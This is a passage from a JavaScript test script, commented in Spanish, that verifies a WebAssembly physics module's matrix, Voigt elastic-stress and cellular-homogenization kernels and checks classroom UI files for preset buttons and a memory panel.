assert(matResidual < 1e-14, 'Residuo formal de multiplicación matricial 3x3 en memoria lineal Wasm es nulo (||C_wasm - C_exact|| < 1e-14)');

// 4. Kernel Canónico de Mecánica de Medios Continuos: Contracción Voigt 6x6
const voigtProg = NailangWasm.CANONICAL_PHYSICS_PROGRAMS.elastic_stress_voigt;
assert(typeof voigtProg === 'string' && voigtProg.includes('voigt_elastic_stress'), 'Kernel canónico elastic_stress_voigt disponible en NailangWasm');

const C_stiff = new Array(36).fill(0);
C_stiff[0] = 120; C_stiff[1] = 40;  C_stiff[2] = 40;
C_stiff[7] = 120; C_stiff[6] = 40;  C_stiff[8] = 40;
C_stiff[14] = 120; C_stiff[12] = 40; C_stiff[13] = 40;
C_stiff[21] = 40; C_stiff[28] = 40; C_stiff[35] = 40;
const eps_vec = [0.001, 0, 0, 0, 0, 0];

const voigtRun = await NailangWasm.compileAndRun(
  voigtProg,
  'voigt_elastic_stress',
  [0.0, 36.0, 42.0],
  {
    initialMemory: { 0: C_stiff, 36: eps_vec },
    readMemoryOffset: 42,
    readMemoryLength: 6
  }
);
assert(Math.abs(voigtRun.memory[0] - 0.12) < 1e-12 && Math.abs(voigtRun.memory[1] - 0.04) < 1e-12, 'Contracción de Cauchy-Hooke sigma = C : eps calcula tensiones normales exactas en Wasm');
assert(Math.abs(voigtRun.result - 0.08) < 1e-12, 'Tensión equivalente de Von Mises se calcula fielmente en Wasm (sigma_vm = 0.08 GPa)');

// 5. Kernel Canónico de Homogenización Celular Periódica (Cotas de Hill)
const homogProg = NailangWasm.CANONICAL_PHYSICS_PROGRAMS.cellular_homogenization_1d;
assert(typeof homogProg === 'string' && homogProg.includes('cellular_homogenize'), 'Kernel canónico cellular_homogenization_1d disponible en NailangWasm');

const cellModuli = [10.0, 20.0, 50.0, 100.0];
const homogRun = await NailangWasm.compileAndRun(
  homogProg,
  'cellular_homogenize',
  [0.0, 4.0],
  {
    initialMemory: { 0: cellModuli },
    readMemoryOffset: 4,
    readMemoryLength: 3
  }
);
const [eV, eR, eH] = homogRun.memory;
assert(Math.abs(eV - 45.0) < 1e-12, 'Cota superior de Voigt (media aritmética) calculada exactamente en Wasm (E_V = 45.0 GPa)');
assert(Math.abs(eR - 22.22222222222222) < 1e-10, 'Cota inferior de Reuss (media armónica) calculada exactamente en Wasm (E_R = 22.22 GPa)');
assert(eR <= eH && eH <= eV, 'Invariante físico de Hill verificado estrictamente en silicio: E_Reuss <= E_Hill <= E_Voigt');

// 6. Verificación de UI e Integración en Classroom
assert(classroomHtmlNai.includes("loadNailangPreset('tensor_matmul_3x3')"), 'classroom.html incluye botón de preset para Matriz 3x3 en memoria');
assert(classroomHtmlNai.includes("loadNailangPreset('elastic_stress_voigt')"), 'classroom.html incluye botón de preset para Contracción Voigt 6x6');
assert(classroomHtmlNai.includes("loadNailangPreset('cellular_homogenization_1d')"), 'classroom.html incluye botón de preset para Homogenización Celular');
assert(classroomHtmlNai.includes('id="nailang-memory-panel"'), 'classroom.html incluye panel de inspección de memoria lineal Wasm');

assert(classroomJsNai.includes('tensor_matmul_3x3') && classroomJsNai.includes('elastic_stress_voigt') && classroomJsNai.includes('cellular_homogenization_1d'), 'classroom_controller.js implementa carga de presets tensoriales');
assert(classroomJsNai.includes('nailang-memory-display') && classroomJsNai.includes('runResult.memory'), 'classroom_controller.js renderiza estado de memoria lineal Wasm en HUD');

// ─────────────────────────────────────────────────────────────────────────────
// RESUMEN FINAL DE CERTIFICACIÓN
// ─────────────────────────────────────────────────────────────────────────────
console.log('\n═══════════════════════════════════════════════════════════════════════');
console.log(`📊 RESULTADO DE LA AUDITORÍA: ${passedTests} APROBADAS / ${failedTests} FALLADAS (TOTAL: ${totalTests})`);
if (failedTests === 0) {
  console.log('Pruebas básicas aprobadas. No certifican precisión general, ausencia de deuda técnica ni descubrimientos científicos.');
} else {
  console.error('⚠  SE HAN DETECTADO DISCREPANCIAS QUE DEBEN SUBSANARSE.');
}
console.log('═══════════════════════════════════════════════════════════════════════\n');

process.exit(failedTests === 0 ? 0 : 1);


